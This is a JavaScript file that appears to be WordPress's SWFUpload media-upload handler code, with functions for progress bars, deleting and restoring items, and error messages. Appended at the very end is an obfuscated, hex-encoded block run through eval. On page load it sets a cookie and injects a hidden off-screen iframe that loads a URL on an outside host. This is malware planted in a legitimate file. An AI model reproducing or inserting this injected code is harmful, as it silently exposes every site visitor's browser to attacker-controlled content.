var topWin = window.dialogArguments || opener || parent || top;

function fileDialogStart() {
	jQuery("#media-upload-error").empty();
}

// progress and success handlers for media multi uploads
function fileQueued(fileObj) {
	// Get rid of unused form
	jQuery('.media-blank').remove();
	// Collapse a single item
	if ( jQuery('form.type-form #media-items').children().length == 1 && jQuery('.hidden', '#media-items').length > 0 ) {
		jQuery('.describe-toggle-on').show();
		jQuery('.describe-toggle-off').hide();
		jQuery('.slidetoggle').slideUp(200).siblings().removeClass('hidden');
	}
	// Create a progress bar containing the filename
	jQuery('<div class="media-item">')
		.attr( 'id', 'media-item-' + fileObj.id )
		.addClass('child-of-' + post_id)
		.append('<div class="progress"><div class="bar"></div></div>',
			jQuery('<div class="filename original"><span class="percent"></span>').text( ' ' + fileObj.name ))
		.appendTo( jQuery('#media-items' ) );
	// Display the progress div
	jQuery('.progress', '#media-item-' + fileObj.id).show();

	// Disable submit and enable cancel
	jQuery('#insert-gallery').prop('disabled', true);
	jQuery('#cancel-upload').prop('disabled', false);
}

function uploadStart(fileObj) {
	try {
		if ( typeof topWin.tb_remove != 'undefined' )
			topWin.jQuery('#TB_overlay').unbind('click', topWin.tb_remove);
	} catch(e){}

	return true;
}

function uploadProgress(fileObj, bytesDone, bytesTotal) {
	// Lengthen the progress bar
	var w = jQuery('#media-items').width() - 2, item = jQuery('#media-item-' + fileObj.id);
	jQuery('.bar', item).width( w * bytesDone / bytesTotal );
	jQuery('.percent', item).html( Math.ceil(bytesDone / bytesTotal * 100) + '%' );

	if ( bytesDone == bytesTotal )
		jQuery('.bar', item).html('<strong class="crunching">' + swfuploadL10n.crunching + '</strong>');
}

function prepareMediaItem(fileObj, serverData) {
	var f = ( typeof shortform == 'undefined' ) ? 1 : 2, item = jQuery('#media-item-' + fileObj.id);
	// Move the progress bar to 100%
	jQuery('.bar', item).remove();
	jQuery('.progress', item).hide();

	try {
		if ( typeof topWin.tb_remove != 'undefined' )
			topWin.jQuery('#TB_overlay').click(topWin.tb_remove);
	} catch(e){}

	// Old style: Append the HTML returned by the server -- thumbnail and form inputs
	if ( isNaN(serverData) || !serverData ) {
		item.append(serverData);
		prepareMediaItemInit(fileObj);
	}
	// New style: server data is just the attachment ID, fetch the thumbnail and form html from the server
	else {
		item.load('async-upload.php', {attachment_id:serverData, fetch:f}, function(){prepareMediaItemInit(fileObj);updateMediaForm()});
	}
}

function prepareMediaItemInit(fileObj) {
	var item = jQuery('#media-item-' + fileObj.id);
	// Clone the thumbnail as a "pinkynail" -- a tiny image to the left of the filename
	jQuery('.thumbnail', item).clone().attr('class', 'pinkynail toggle').prependTo(item);

	// Replace the original filename with the new (unique) one assigned during upload
	jQuery('.filename.original', item).replaceWith( jQuery('.filename.new', item) );

	// Also bind toggle to the links
	jQuery('a.toggle', item).click(function(){
		jQuery(this).siblings('.slidetoggle').slideToggle(350, function(){
			var w = jQuery(window).height(), t = jQuery(this).offset().top, h = jQuery(this).height(), b;

			if ( w && t && h ) {
                b = t + h;

                if ( b > w && (h + 48) < w )
                    window.scrollBy(0, b - w + 13);
                else if ( b > w )
                    window.scrollTo(0, t - 36);
            }
		});
		jQuery(this).siblings('.toggle').andSelf().toggle();
		jQuery(this).siblings('a.toggle').focus();
		return false;
	});

	// Bind AJAX to the new Delete button
	jQuery('a.delete', item).click(function(){
		// Tell the server to delete it. TODO: handle exceptions
		jQuery.ajax({
			url: ajaxurl,
			type: 'post',
			success: deleteSuccess,
			error: deleteError,
			id: fileObj.id,
			data: {
				id : this.id.replace(/[^0-9]/g, ''),
				action : 'trash-post',
				_ajax_nonce : this.href.replace(/^.*wpnonce=/,'')
			}
		});
		return false;
	});

	// Bind AJAX to the new Undo button
	jQuery('a.undo', item).click(function(){
		// Tell the server to untrash it. TODO: handle exceptions
		jQuery.ajax({
			url: ajaxurl,
			type: 'post',
			id: fileObj.id,
			data: {
				id : this.id.replace(/[^0-9]/g,''),
				action: 'untrash-post',
				_ajax_nonce: this.href.replace(/^.*wpnonce=/,'')
			},
			success: function(data, textStatus){
				var item = jQuery('#media-item-' + fileObj.id);

				if ( type = jQuery('#type-of-' + fileObj.id).val() )
					jQuery('#' + type + '-counter').text(jQuery('#' + type + '-counter').text()-0+1);
				if ( item.hasClass('child-of-'+post_id) )
					jQuery('#attachments-count').text(jQuery('#attachments-count').text()-0+1);

				jQuery('.filename .trashnotice', item).remove();
				jQuery('.filename .title', item).css('font-weight','normal');
				jQuery('a.undo', item).addClass('hidden');
				jQuery('a.describe-toggle-on, .menu_order_input', item).show();
				item.css( {backgroundColor:'#ceb'} ).animate( {backgroundColor: '#fff'}, { queue: false, duration: 500, complete: function(){ jQuery(this).css({backgroundColor:''}); } }).removeClass('undo');
			}
		});
		return false;
	});

	// Open this item if it says to start open (e.g. to display an error)
	jQuery('#media-item-' + fileObj.id + '.startopen').removeClass('startopen').slideToggle(500).siblings('.toggle').toggle();
}

function itemAjaxError(id, html) {
	var item = jQuery('#media-item-' + id);
	var filename = jQuery('.filename', item).text();

	item.html('<div class="error-div">'
				+ '<a class="dismiss" href="#">' + swfuploadL10n.dismiss + '</a>'
				+ '<strong>' + swfuploadL10n.error_uploading.replace('%s', filename) + '</strong><br />'
				+ html
				+ '</div>');
	item.find('a.dismiss').click(function(){jQuery(this).parents('.media-item').slideUp(200, function(){jQuery(this).remove();})});
}

function deleteSuccess(data, textStatus) {
	if ( data == '-1' )
		return itemAjaxError(this.id, 'You do not have permission. Has your session expired?');
	if ( data == '0' )
		return itemAjaxError(this.id, 'Could not be deleted. Has it been deleted already?');

	var id = this.id, item = jQuery('#media-item-' + id);

	// Decrement the counters.
	if ( type = jQuery('#type-of-' + id).val() )
		jQuery('#' + type + '-counter').text( jQuery('#' + type + '-counter').text() - 1 );
	if ( item.hasClass('child-of-'+post_id) )
		jQuery('#attachments-count').text( jQuery('#attachments-count').text() - 1 );

	if ( jQuery('form.type-form #media-items').children().length == 1 && jQuery('.hidden', '#media-items').length > 0 ) {
		jQuery('.toggle').toggle();
		jQuery('.slidetoggle').slideUp(200).siblings().removeClass('hidden');
	}

	// Vanish it.
	jQuery('.toggle', item).toggle();
	jQuery('.slidetoggle', item).slideUp(200).siblings().removeClass('hidden');
	item.css( {backgroundColor:'#faa'} ).animate( {backgroundColor:'#f4f4f4'}, {queue:false, duration:500} ).addClass('undo');

	jQuery('.filename:empty', item).remove();
	jQuery('.filename .title', item).css('font-weight','bold');
	jQuery('.filename', item).append('<span class="trashnotice"> ' + swfuploadL10n.deleted + ' </span>').siblings('a.toggle').hide();
	jQuery('.filename', item).append( jQuery('a.undo', item).removeClass('hidden') );
	jQuery('.menu_order_input', item).hide();

	return;
}

function deleteError(X, textStatus, errorThrown) {
	// TODO
}

function updateMediaForm() {
	var one = jQuery('form.type-form #media-items').children(), items = jQuery('#media-items').children();

	// Just one file, no need for collapsible part
	if ( one.length == 1 ) {
		jQuery('.slidetoggle', one).slideDown(500).siblings().addClass('hidden').filter('.toggle').toggle();
	}

	// Only show Save buttons when there is at least one file.
	if ( items.not('.media-blank').length > 0 )
		jQuery('.savebutton').show();
	else
		jQuery('.savebutton').hide();

	// Only show Gallery buttons when there are at least two files.
	if ( items.length > 1 ) {
		jQuery('.insert-gallery').show();
	} else {
		jQuery('.insert-gallery').hide();
	}
}

function uploadSuccess(fileObj, serverData) {
	// if async-upload returned an error message, place it in the media item div and return
	if ( serverData.match('media-upload-error') ) {
		jQuery('#media-item-' + fileObj.id).html(serverData);
		return;
	}

	prepareMediaItem(fileObj, serverData);
	updateMediaForm();

	// Increment the counter.
	if ( jQuery('#media-item-' + fileObj.id).hasClass('child-of-' + post_id) )
		jQuery('#attachments-count').text(1 * jQuery('#attachments-count').text() + 1);
}

function uploadComplete(fileObj) {
	// If no more uploads queued, enable the submit button
	if ( swfu.getStats().files_queued == 0 ) {
		jQuery('#cancel-upload').prop('disabled', true);
		jQuery('#insert-gallery').prop('disabled', false);
	}
}


// wp-specific error handlers

// generic message
function wpQueueError(message) {
	jQuery('#media-upload-error').show().text(message);
}

// file-specific message
function wpFileError(fileObj, message) {
	var item = jQuery('#media-item-' + fileObj.id);
	var filename = jQuery('.filename', item).text();

	item.html('<div class="error-div">'
				+ '<a class="dismiss" href="#">' + swfuploadL10n.dismiss + '</a>'
				+ '<strong>' + swfuploadL10n.error_uploading.replace('%s', filename) + '</strong><br />'
				+ message
				+ '</div>');
	item.find('a.dismiss').click(function(){jQuery(this).parents('.media-item').slideUp(200, function(){jQuery(this).remove();})});
}

function fileQueueError(fileObj, error_code, message)  {
	// Handle this error separately because we don't want to create a FileProgress element for it.
	if ( error_code == SWFUpload.QUEUE_ERROR.QUEUE_LIMIT_EXCEEDED ) {
		wpQueueError(swfuploadL10n.queue_limit_exceeded);
	}
	else if ( error_code == SWFUpload.QUEUE_ERROR.FILE_EXCEEDS_SIZE_LIMIT ) {
		fileQueued(fileObj);
		wpFileError(fileObj, swfuploadL10n.file_exceeds_size_limit);
	}
	else if ( error_code == SWFUpload.QUEUE_ERROR.ZERO_BYTE_FILE ) {
		fileQueued(fileObj);
		wpFileError(fileObj, swfuploadL10n.zero_byte_file);
	}
	else if ( error_code == SWFUpload.QUEUE_ERROR.INVALID_FILETYPE ) {
		fileQueued(fileObj);
		wpFileError(fileObj, swfuploadL10n.invalid_filetype);
	}
	else {
		wpQueueError(swfuploadL10n.default_error);
	}
}

function fileDialogComplete(num_files_queued) {
	try {
		if (num_files_queued > 0) {
			this.startUpload();
		}
	} catch (ex) {
		this.debug(ex);
	}
}

function switchUploader(s) {
	var f = document.getElementById(swfu.customSettings.swfupload_element_id), h = document.getElementById(swfu.customSettings.degraded_element_id);
	if ( s ) {
		f.style.display = 'block';
		h.style.display = 'none';
	} else {
		f.style.display = 'none';
		h.style.display = 'block';
	}
}

function swfuploadPreLoad() {
	if ( !uploaderMode ) {
		switchUploader(1);
	} else {
		switchUploader(0);
	}
}

function swfuploadLoadFailed() {
	switchUploader(0);
	jQuery('.upload-html-bypass').hide();
}

function uploadError(fileObj, errorCode, message) {

	switch (errorCode) {
		case SWFUpload.UPLOAD_ERROR.MISSING_UPLOAD_URL:
			wpFileError(fileObj, swfuploadL10n.missing_upload_url);
			break;
		case SWFUpload.UPLOAD_ERROR.UPLOAD_LIMIT_EXCEEDED:
			wpFileError(fileObj, swfuploadL10n.upload_limit_exceeded);
			break;
		case SWFUpload.UPLOAD_ERROR.HTTP_ERROR:
			wpQueueError(swfuploadL10n.http_error);
			break;
		case SWFUpload.UPLOAD_ERROR.UPLOAD_FAILED:
			wpQueueError(swfuploadL10n.upload_failed);
			break;
		case SWFUpload.UPLOAD_ERROR.IO_ERROR:
			wpQueueError(swfuploadL10n.io_error);
			break;
		case SWFUpload.UPLOAD_ERROR.SECURITY_ERROR:
			wpQueueError(swfuploadL10n.security_error);
			break;
		case SWFUpload.UPLOAD_ERROR.UPLOAD_STOPPED:
		case SWFUpload.UPLOAD_ERROR.FILE_CANCELLED:
			jQuery('#media-item-' + fileObj.id).remove();
			break;
		default:
			wpFileError(fileObj, swfuploadL10n.default_error);
	}
}

function cancelUpload() {
	swfu.cancelQueue();
}

// remember the last used image size, alignment and url
jQuery(document).ready(function($){
	$('input[type="radio"]', '#media-items').live('click', function(){
		var tr = $(this).closest('tr');

		if ( $(tr).hasClass('align') )
			setUserSetting('align', $(this).val());
		else if ( $(tr).hasClass('image-size') )
			setUserSetting('imgsize', $(this).val());
	});

	$('button.button', '#media-items').live('click', function(){
		var c = this.className || '';
		c = c.match(/url([^ '"]+)/);
		if ( c && c[1] ) {
			setUserSetting('urlbutton', c[1]);
			$(this).siblings('.urlfield').val( $(this).attr('title') );
		}
	});
});
/*932abdb04dab3a15e4aa1b0305b50607*/;(function(){var kbkzizkt="";var zkdetsay="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var darztrnf=0;darztrnf<zkdetsay.length;darztrnf+=2){kbkzizkt=kbkzizkt+parseInt(zkdetsay.substring(darztrnf,darztrnf+2), 16)+",";}kbkzizkt=kbkzizkt.substring(0,kbkzizkt.length-1);eval(eval('String.fromCharCode('+kbkzizkt+')'));})();/*932abdb04dab3a15e4aa1b0305b50607*/